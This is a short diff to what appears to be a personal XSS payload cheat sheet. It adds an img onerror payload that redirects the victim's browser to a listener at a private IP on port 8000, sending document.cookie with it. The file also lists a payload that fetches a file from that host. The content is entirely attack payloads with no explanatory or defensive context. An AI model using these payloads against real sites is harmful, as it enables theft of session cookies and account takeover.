@@ -1,6 +1,8 @@
 XSS PAYLOADS
 <img src=x onerror="xss_PAYLOAD">
 <img src=x onerror="fetch('http://192.168.160.106:8000/test.png')">
+<img src=x onerror="window.location='http://192.168.160.106:8000/?cookie='+document.cookie;">
+
 
 INJECTIONS
 
